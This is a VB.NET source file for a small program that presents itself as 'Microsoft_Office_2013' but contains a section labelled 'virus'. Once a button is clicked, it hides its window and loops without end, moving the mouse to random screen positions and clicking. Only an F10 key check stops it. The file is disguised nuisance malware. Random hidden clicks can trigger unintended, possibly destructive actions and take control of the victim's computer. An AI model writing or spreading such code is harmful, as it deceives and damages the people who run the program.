Public Class Microsoft_Office_2013
    Private Declare Function GetKeyPress Lib "user32" Alias "GetAsyncKeyState" (ByVal key As Integer) As Integer
    Public Declare Function SetCursorPos Lib "user32.dll" (ByVal x As Long, ByVal y As Long) As Long
    Public Declare Sub mouse_event Lib "user32.dll" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy _
    As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
    Const MOUSEEVENTF_ABSOLUTE = &H8000
    Const MOUSEEVENTF_LEFTDOWN = &H2
    Const MOUSEEVENTF_LEFTUP = &H4
    Const MOUSEEVENTF_MIDDLEDOWN = &H20
    Const MOUSEEVENTF_MIDDLEUP = &H40
    Const MOUSEEVENTF_MOVE = &H1
    Const MOUSEEVENTF_RIGHTDOWN = &H8
    Const MOUSEEVENTF_RIGHTUP = &H10
    Const MOUSEEVENTF_WHEEL = &H80
    Const MOUSEEVENTF_XDOWN = &H100
    Const MOUSEEVENTF_XUP = &H200
    Const WHEEL_DELTA = 120
    Const XBUTTON1 = &H1
    Const XBUTTON2 = &H2

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Timer1.Start()
        Me.Hide()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Timer1.Start()
        Me.Hide()
    End Sub

#Region "virus"
    Private Sub randomnumber()
        randomnumber2()
        Dim SpinAnswer As Integer
        Dim rand As New Random
        SpinAnswer = rand.Next(1, 999)
        BtnSpinAnswer.Text = SpinAnswer
        movemau()
    End Sub
    Private Sub randomnumber2()
        Dim SpinAnswer2 As Integer
        Dim rand As New Random
        SpinAnswer2 = rand.Next(1, 999)
        Label2.Text = SpinAnswer2
    End Sub

    Private Sub movemau()
        SetCursorPos(BtnSpinAnswer.Text.ToString, Label2.Text.ToString)
        clickmau()
    End Sub

    Private Sub clickmau()
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
    End Sub

    Private Sub keypressed()
        If GetKeyPress(Keys.F10) Then
            End
        End If
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        For i As Integer = 0 To 2
            keypressed()
            randomnumber()
            i -= 1
        Next
    End Sub
#End Region

End Class